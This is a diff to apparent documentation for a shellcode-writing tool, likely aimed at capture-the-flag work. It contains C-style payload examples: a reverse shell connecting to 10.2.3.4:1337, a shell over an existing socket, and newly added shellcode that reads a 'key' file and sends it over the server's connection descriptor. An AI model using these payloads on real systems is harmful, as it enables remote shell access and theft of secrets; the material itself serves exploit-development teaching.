@@ -13,9 +13,7 @@ bash session.
 void main()
 {
 	int s = create_tcp4_connection(IPV4_ADDR(10, 2, 3, 4), 1337);
-	dup2(s, 0);
-	dup2(s, 1);
-	dup2(s, 2);
+	redirect_io(s);
 	interactive_bash();
 }
 ---------------------------------------
@@ -29,9 +27,7 @@ a standard call instruction with the socket pushed onto the stack.
 ---------------------------------------
 void main(int sock)
 {
-	dup2(sock, 0);
-	dup2(sock, 1);
-	dup2(sock, 2);
+	redirect_io(sock);
 	interactive_bash();
 }
 ---------------------------------------
@@ -52,3 +48,19 @@ void main(int sock)
 	goto *code;
 }
 ---------------------------------------
+
+Read a file
+-----------
+The following shellcode reads a small file called `key` and sends it back over file
+descriptor 4, which is typically the incoming connection on a forking server.
+
+---------------------------------------
+void main()
+{
+	char data[64];
+	int fd = open("key", O_RDONLY, 0);
+	int len = read(fd, data, 64);
+	write(4, data, len);
+}
+---------------------------------------
+
